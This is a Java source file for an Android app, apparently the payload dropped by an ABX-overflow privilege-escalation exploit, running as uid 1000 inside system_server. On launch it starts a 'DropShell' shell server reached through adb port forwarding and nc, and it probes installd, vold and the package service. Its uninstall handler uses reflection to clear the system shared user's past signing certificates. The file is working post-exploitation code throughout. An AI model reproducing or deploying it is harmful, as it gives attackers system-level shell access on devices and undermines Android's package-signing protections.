package com.example.abxoverflow.droppedapk;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Process;
import android.view.Menu;
import android.view.MenuItem;
import android.widget.TextView;
import android.widget.Toast;
import android.util.Log;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.lang.reflect.Field;
import java.util.Map;

public class MainActivity extends Activity {

    private static final String TAG = "DropShell";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        LocalShellServer.ensureStarted(this);

        String id = "?";
        try {
            id = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec("id").getInputStream())).readLine();
        } catch (IOException ignored) {}

        StringBuilder s = new StringBuilder();
        s.append("uid=").append(Process.myUid())
                .append(" pid=").append(Process.myPid())
                .append(" (system_server)\n\n")
                .append(id)
                .append("\n\nDropShell: adb forward tcp:")
                .append(LocalShellServer.PORT)
                .append(" tcp:")
                .append(LocalShellServer.PORT)
                .append("\nthen: nc 127.0.0.1 ")
                .append(LocalShellServer.PORT)
                .append("\nrunning=")
                .append(LocalShellServer.isRunning())
                .append("\n\ninstalld/vold probes:\n");

        probeService(s, "installd");
        probeService(s, "vold");
        probeService(s, "package");

        s.append("\n\nTry: help | exec dmesg -w | installd copy ... | vold read_partition ...");
        s.append("\nNote: uid 1000, not kernel root. /system writes break AVB — use /data only.");

        ((TextView) findViewById(R.id.app_text)).setText(s.toString());

        try {
            Log.i(TAG, "Installd ping: " + new InstalldClient().installd());
            Log.i(TAG, "PMS installer: " + PmsHelper.getInstallerFromPms());
        } catch (Exception e) {
            Log.e(TAG, "startup probes failed", e);
        }
    }

    private static void probeService(StringBuilder s, String name) {
        try {
            Object obj = Class.forName("android.os.ServiceManager")
                    .getMethod("getService", String.class)
                    .invoke(null, name);
            s.append(name).append(": ").append(obj == null ? "null" : obj.toString()).append("\n");
        } catch (Exception e) {
            s.append(name).append(": ").append(e.getMessage()).append("\n");
        }
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(R.menu.menu_main, menu);
        return true;
    }

    @Override
    @SuppressLint("MissingPermission")
    public boolean onOptionsItemSelected(MenuItem item) {
        if (item.getItemId() == R.id.uninstall) {
            try {
                Object packManImplService = Class.forName("android.os.ServiceManager")
                        .getMethod("getService", String.class).invoke(null, "package");
                Field packManImplThisField = packManImplService.getClass().getDeclaredField("this$0");
                packManImplThisField.setAccessible(true);
                Object packManService = packManImplThisField.get(packManImplService);
                Field settingsField = packManService.getClass().getDeclaredField("mSettings");
                settingsField.setAccessible(true);
                Object settings = settingsField.get(packManService);
                Field sharedUsersField = settings.getClass().getDeclaredField("mSharedUsers");
                sharedUsersField.setAccessible(true);
                Object sharedUser = ((Map) sharedUsersField.get(settings)).get("android.uid.system");
                Object signingDetails = sharedUser.getClass().getMethod("getSigningDetails").invoke(sharedUser);
                Field pastSigningCertificatesField = signingDetails.getClass().getDeclaredField("mPastSigningCertificates");
                pastSigningCertificatesField.setAccessible(true);
                pastSigningCertificatesField.set(signingDetails, null);

                getPackageManager().getPackageInstaller().uninstall(getPackageName(), null);
            } catch (Exception e) {
                e.printStackTrace();
                Toast.makeText(this, "Uninstall failed", Toast.LENGTH_SHORT).show();
            }
            return true;
        }
        return super.onOptionsItemSelected(item);
    }
}
